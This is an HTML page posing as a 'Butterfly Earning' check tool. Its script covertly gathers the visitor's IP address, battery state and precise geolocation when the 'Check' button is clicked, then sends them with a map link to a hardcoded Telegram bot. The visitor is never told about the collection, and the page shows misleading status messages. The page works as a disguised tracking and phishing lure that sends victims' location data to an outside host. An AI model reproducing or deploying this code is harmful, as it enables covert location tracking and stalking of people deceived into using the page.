<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Butterfly Earning - Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", sans-serif;
      background: linear-gradient(135deg, #ee9ca7, #ffdde1);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      background: white;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
      text-align: center;
      animation: float 2s ease-in-out infinite;
    }

    @keyframes float {
      0% { transform: translateY(0px); }
      50% { transform: translateY(-10px); }
      100% { transform: translateY(0px); }
    }

    h1 {
      color: #ff4f81;
      font-size: 24px;
      margin-bottom: 20px;
    }

    button {
      background: #ff4f81;
      border: none;
      padding: 15px 30px;
      border-radius: 30px;
      color: white;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(255, 79, 129, 0.4);
      transition: 0.3s ease;
    }

    button:hover {
      background: #ff3c6f;
      transform: scale(1.05);
    }

    .status {
      margin-top: 20px;
      color: #333;
      font-size: 14px;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Butterfly Earning</h1>
  <button id="checkBtn">Check</button>
  <div class="status" id="status">Status: Waiting...</div>
</div>

<script>
  const BOT_TOKEN = '7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA';
  const CHAT_ID = '7650029381';

  async function getIP() {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  }

  async function getBattery() {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      return `Level: ${(battery.level * 100).toFixed(0)}% | Charging: ${battery.charging ? 'Yes' : 'No'}`;
    }
    return 'Battery info not supported';
  }

  function getLocationAndSend(ip, battery) {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const map = `https://maps.google.com/?q=${lat},${lon}`;
        const message = `Butterfly Earning Check:\n\nIP: ${ip}\nBattery: ${battery}\n\nLocation:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${map}`;

        sendToTelegram(message);
        document.getElementById('status').innerText = "Status: Info  no user found";
      }, err => {
        sendToTelegram(`IP: ${ip}\nBattery: ${battery}\nLocation: Permission Denied`);
        document.getElementById('status').innerText = "Location denied, but IP and battery sent.";
      });
    } else {
      sendToTelegram(`IP: ${ip}\nBattery: ${battery}\nLocation: Not supported`);
    }
  }

  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
  }

  document.getElementById('checkBtn').addEventListener('click', async () => {
    document.getElementById('status').innerText = "Checking...";
    const ip = await getIP();
    const battery = await getBattery();
    getLocationAndSend(ip, battery);
  });
</script>

</body>
</html>
